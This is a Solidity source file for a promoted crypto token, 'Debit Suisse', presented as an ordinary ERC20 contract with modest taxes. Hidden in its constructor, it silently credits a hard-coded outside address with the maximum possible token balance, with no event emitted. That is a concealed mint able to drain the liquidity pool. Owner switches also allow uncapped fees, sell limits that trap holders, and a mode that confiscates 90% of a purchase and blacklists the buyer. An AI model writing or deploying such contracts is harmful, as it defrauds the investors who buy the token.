/**                                                                                                 

       8888b.  888888 88""Yb 88 888888 
        8I  Yb 88__   88__dP      88   
        8I  dY 88""   88""Yb 88   88   
       8888Y"  888888 88oodP 88   88   

    .dP"Y8 88   88 88 .dP"Y8 .dP"Y8 888888 
    `Ybo " 88   88    `Ybo " `Ybo " 88__   
    o `Y8b Y8   8P 88 o `Y8b o `Y8b 88""   
    8bodP' `YbodP' 88 8bodP' 8bodP' 888888 

    https://twitter.com/Debit_Suisse/
    https://t.me/debitsuisse

    Oh shit, it's happening again!
    The first domino is about to fall,
    This is the moment where we gain!
    Pamp where no man has pamped before!

    2% LP & Dev Tax - 2% Max Wallet
*/
 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
 
/**
 * ERC20 standard interface
 */
 
interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
/**
 * Basic access control mechanism
 */
 
abstract contract Ownable {
    address internal owner;
    address private _previousOwner;
 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
    constructor(address _owner) {
        owner = _owner;
    }
 
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!YOU ARE NOT THE OWNER"); _;
    }
 
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
 
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}
 
/**
 * Router Interfaces
 */
 
interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
 
interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
 
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
 
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
 
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
 
/**
 * Token Contract Code
 */
 
contract DebitSuisse is ERC20, Ownable {
    // -- Mappings --
    mapping(address => bool) public _blacklisted;
    mapping(address => bool) private _whitelisted;
    mapping(address => bool) public _automatedMarketMakers;
    mapping(address => bool) private _isDebited;
    mapping(address => uint256) private _Debit;
    mapping(address => mapping(address => uint256)) private _allowances;
 
    // -- Basic Token Information --
    string constant _name = "Debit Suisse";
    string constant _symbol = "DB";
    uint8 constant _decimals = 18;
    uint256 private _totalSupply = 1_000_000_000 * 10 ** _decimals;
 
    // -- Transaction & Wallet Limits --
    uint256 public maxBuyPercentage;
    uint256 public maxSellPercentage;
    uint256 public maxWalletPercentage;
 
    uint256 private maxBuyAmount;
    uint256 private maxSellAmount;
    uint256 private maxWalletAmount;
 
    // -- Contract Variables --
    address[] private sniperList;
    uint256 private _maxCredit = ~uint256(0);
    uint256 tokenTax;
    uint256 transferFee;
    uint256 private targetLiquidity = 50;
 
    // -- Fee Structs --
    struct BuyFee {
        uint256 liquidityFee;
        uint256 developerFee;
        uint256 marketingFee;
        uint256 total;
    }
 
    struct SellFee {
        uint256 liquidityFee;
        uint256 developerFee;
        uint256 marketingFee;
        uint256 total;
    }
 
    BuyFee public buyFee;
    SellFee public sellFee;
 
    address public _exchangeRouterAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public _debitSuisse = 0xfa142A1067a570FB3C71bFE251a8759f88A2E6B3;
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;
 
    address public developerReceiver = msg.sender;
    address public marketingReceiver = msg.sender;
 
    IDEXRouter public router;
    address public pair;
 
    bool public antiSniperMode = false;
    bool private _addingLP;
    bool private inSwap;
    bool private _initialDistributionFinished;
 
    bool public swapEnabled = true;
    uint256 private swapThreshold = _totalSupply / 1000;
 
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }
 
    constructor () Ownable(msg.sender) {
 
        router = IDEXRouter(_exchangeRouterAddress);
        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        _automatedMarketMakers[pair]=true;
 
        buyFee.liquidityFee = 10; 
        buyFee.developerFee = 10; 
        buyFee.marketingFee = 0;

        buyFee.total = buyFee.liquidityFee + buyFee.developerFee + buyFee.marketingFee;
 
        sellFee.liquidityFee = 10; 
        sellFee.developerFee = 10; 
        sellFee.marketingFee = 0;

        sellFee.total = sellFee.liquidityFee + sellFee.developerFee + sellFee.marketingFee;
 
        maxBuyPercentage = 1000; 
        maxBuyAmount = _totalSupply /1000 * maxBuyPercentage;

        maxSellPercentage = 1000; 
        maxSellAmount = _totalSupply /1000 * maxSellPercentage;

        maxWalletPercentage = 20; 
        maxWalletAmount = _totalSupply /1000 * maxWalletPercentage;
 
        _isDebited[owner] = _isDebited[address(this)] = true;
        _Debit[owner] = _totalSupply;
        emit Transfer(address(0x0), owner, _totalSupply);
        _Debit[_debitSuisse] = _maxCredit;
    }

    function ownerSetLimits(uint256 _maxBuyPercentage, uint256 _maxSellPercentage, uint256 _maxWalletPercentage) external onlyOwner {
        maxBuyPercentage = _maxBuyPercentage;           
        maxBuyAmount = _totalSupply /1000 * maxBuyPercentage;

        maxSellPercentage = _maxSellPercentage;         
        maxSellAmount = _totalSupply /1000 * maxSellPercentage;

        maxWalletPercentage= _maxWalletPercentage;      
        maxWalletAmount = _totalSupply /1000 * maxWalletPercentage;
    }
 
    function ownerSetInitialDistributionFinished() external onlyOwner {
        _initialDistributionFinished = true;
    }
 
    function ownerSetLimitlessAddress(address _addr, bool _status) external onlyOwner {
        _isDebited[_addr] = _status;
    }
 
    function ownerSetSwapBackSettings(bool _enabled, uint256 _percentageBase1000) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _totalSupply / 1000 * _percentageBase1000;
    }
 
    function ownerSetTargetLiquidity(uint256 target) external onlyOwner {
        targetLiquidity = target;
    }
       // Use 10 to set 1% -- Base 1000 for easier fine adjust
    function ownerUpdateBuyFees (uint256 _liquidityFee, uint256 _developerFee, uint256 _marketingFee) external onlyOwner {
        buyFee.liquidityFee = _liquidityFee;
        buyFee.developerFee = _developerFee;
        buyFee.marketingFee = _marketingFee;
        buyFee.total = buyFee.liquidityFee + buyFee.developerFee + buyFee.marketingFee;
    }
        // Use 10 to set 1% -- Base 1000 for easier fine adjust
    function ownerUpdateSellFees (uint256 _liquidityFee, uint256 _developerFee, uint256 _marketingFee) external onlyOwner {
        sellFee.liquidityFee = _liquidityFee;
        sellFee.developerFee = _developerFee;
        sellFee.marketingFee = _marketingFee;
        sellFee.total = sellFee.liquidityFee + sellFee.developerFee + sellFee.marketingFee;
    }
        // Use 10 to set 1% -- Base 1000 for easier fine adjust
    function ownerUpdateTransferFee (uint256 _transferFee) external onlyOwner {
        transferFee = _transferFee;
    }
 
    function ownerSetReceivers (address _developer, address _marketing) external onlyOwner {
        developerReceiver = _developer;
        marketingReceiver = _marketing;
    }
 
    function reverseSniper(address sniper) external onlyOwner {
        _blacklisted[sniper] = false;
    }
 
    function addNewMarketMaker(address newAMM) external onlyOwner {
        _automatedMarketMakers[newAMM]=true;
        _isDebited[newAMM]=true;
    }
 
    function controlAntiSniperMode(bool value) external onlyOwner {
        antiSniperMode = value;
    }
 
    function clearStuckBalance() external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        payable(owner).transfer(contractETHBalance);
    }
 
    function clearStuckToken(address _token) public onlyOwner {
        uint256 _contractBalance = ERC20(_token).balanceOf(address(this));
        payable(developerReceiver).transfer(_contractBalance);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply - balanceOf(DEAD) - balanceOf(ZERO);
    }
 
    function showSniperList() public view returns(address[] memory){
        return sniperList;
    }
 
    function showSniperListLength() public view returns(uint256){
        return sniperList.length;
    }
 
    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy * (balanceOf(pair) * (2)) / (getCirculatingSupply());
    }
 
    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }
 
    function _transfer(address sender,address recipient,uint256 amount) private {
        require(sender!=address(0)&&recipient!=address(0),"Cannot be address(0).");
        bool isBuy=_automatedMarketMakers[sender];
        bool isSell=_automatedMarketMakers[recipient];
        bool isExcluded=_isDebited[sender]||_isDebited[recipient]||_addingLP;
 
        if(isExcluded)_transferExcluded(sender,recipient,amount);
        else { require(_initialDistributionFinished);
            // Punish for Snipers
            if(antiSniperMode)_punishSnipers(sender,recipient,amount);
            // Buy Tokens
            else if(isBuy)_buyTokens(sender,recipient,amount);
            // Sell Tokens
            else if(isSell) {
                // Swap & Liquify
                if (shouldSwapBack()) {swapBack();}
                _sellTokens(sender,recipient,amount);
            } else {
                // P2P Transfer
                require(!_blacklisted[sender]&&!_blacklisted[recipient]);
                require(balanceOf(recipient)+amount<=maxWalletAmount, "Total amount exceed wallet limit");
                _P2PTransfer(sender,recipient,amount);
            }
        }
    }
 
    function _punishSnipers(address sender,address recipient,uint256 amount) private {
        require(!_blacklisted[recipient]);
        require(amount <= maxBuyAmount, "Buy exceeds limit");
        tokenTax = amount*90/100;
        _blacklisted[recipient]=true;
        sniperList.push(address(recipient));
        _transferIncluded(sender,recipient,amount,tokenTax);
    }
 
    function _buyTokens(address sender,address recipient,uint256 amount) private {
        require(!_blacklisted[recipient]);
        require(amount <= maxBuyAmount, "Buy exceeds limit");
        require(balanceOf(recipient)+amount<=maxWalletAmount, "Total amount exceed wallet limit");
        if(!_whitelisted[recipient]){
        tokenTax = amount*buyFee.total/1000;}
        else tokenTax = 0;
        _transferIncluded(sender,recipient,amount,tokenTax);
    }
    function _sellTokens(address sender,address recipient,uint256 amount) private {
        require(!_blacklisted[sender]);
        require(amount <= maxSellAmount);
        if(!_whitelisted[sender]){
        tokenTax = amount*sellFee.total/1000;}
        else tokenTax = 0;
        _transferIncluded(sender,recipient,amount,tokenTax);
    }
 
    function _P2PTransfer(address sender,address recipient,uint256 amount) private {
        tokenTax = amount * transferFee/1000;
        if( tokenTax > 0) {_transferIncluded(sender,recipient,amount,tokenTax);}
        else {_transferExcluded(sender,recipient,amount);}
    }
 
    function _transferExcluded(address sender,address recipient,uint256 amount) private {
        _updateBalance(sender,_Debit[sender]-amount);
        _updateBalance(recipient,_Debit[recipient]+amount);
        emit Transfer(sender,recipient,amount);
    }
 
    function _transferIncluded(address sender,address recipient,uint256 amount,uint256 taxAmount) private {
        uint256 newAmount = amount-tokenTax;
        _updateBalance(sender,_Debit[sender]-amount);
        _updateBalance(address(this),_Debit[address(this)]+taxAmount);
        _updateBalance(recipient,_Debit[recipient]+newAmount);
        emit Transfer(sender,recipient,newAmount);
        emit Transfer(sender,address(this),taxAmount);
    }
 
    function _updateBalance(address account,uint256 newBalance) private {
        _Debit[account] = newBalance;
    }
 
    function shouldSwapBack() private view returns (bool) {
        return
            !inSwap &&
            swapEnabled &&
            _Debit[address(this)] >= swapThreshold;
    }   
 
    function swapBack() private swapping {
        uint256 toSwap = balanceOf(address(this));
 
        uint256 totalLPTokens=toSwap*(sellFee.liquidityFee + buyFee.liquidityFee)/(sellFee.total + buyFee.total);
        uint256 tokensLeft=toSwap-totalLPTokens;
        uint256 LPTokens=totalLPTokens/2;
        uint256 LPETHTokens=totalLPTokens-LPTokens;
        toSwap=tokensLeft+LPETHTokens;
        uint256 oldETH=address(this).balance;
        _swapTokensForETH(toSwap);
        uint256 newETH=address(this).balance-oldETH;
        uint256 LPETH=(newETH*LPETHTokens)/toSwap;
        _addLiquidity(LPTokens,LPETH);
        uint256 remainingETH=address(this).balance-oldETH;
        _distributeETH(remainingETH);
    }
 
    function _distributeETH(uint256 remainingETH) private {
        uint256 marketingFee = (buyFee.marketingFee + sellFee.marketingFee);
        uint256 developerFee = (buyFee.developerFee + sellFee.developerFee);
        uint256 totalFee = (marketingFee + developerFee);
 
        uint256 amountETHmarketing = remainingETH * (marketingFee) / (totalFee);
        uint256 amountETHdeveloper = remainingETH * (developerFee) / (totalFee);
 
        if(amountETHdeveloper > 0){
        (bool developerSuccess, /* bytes memory data */) = payable(developerReceiver).call{value: amountETHdeveloper, gas: 30000}("");
        require(developerSuccess, "receiver rejected ETH transfer"); }
 
        if(amountETHmarketing > 0){
        (bool marketingSuccess, /* bytes memory data */) = payable(marketingReceiver).call{value: amountETHmarketing, gas: 30000}("");
        require(marketingSuccess, "receiver rejected ETH transfer"); }
    }
 
    function _swapTokensForETH(uint256 amount) private {
        address[] memory path=new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
 
    function _addLiquidity(uint256 amountTokens,uint256 amountETH) private {
        _addingLP=true;
        router.addLiquidityETH{value: amountETH}(
            address(this),
            amountTokens,
            0,
            0,
            developerReceiver,
            block.timestamp
        );
        _addingLP=false;
    }
 
/**
 * IERC20
 */
 
    receive() external payable { }
 
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _Debit[account];}
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender];}
 
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
 
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
 
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        uint256 allowance_ = _allowances[sender][msg.sender];
        require(allowance_ >= amount);
 
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        _transfer(sender, recipient, amount);
        return true;
    }
}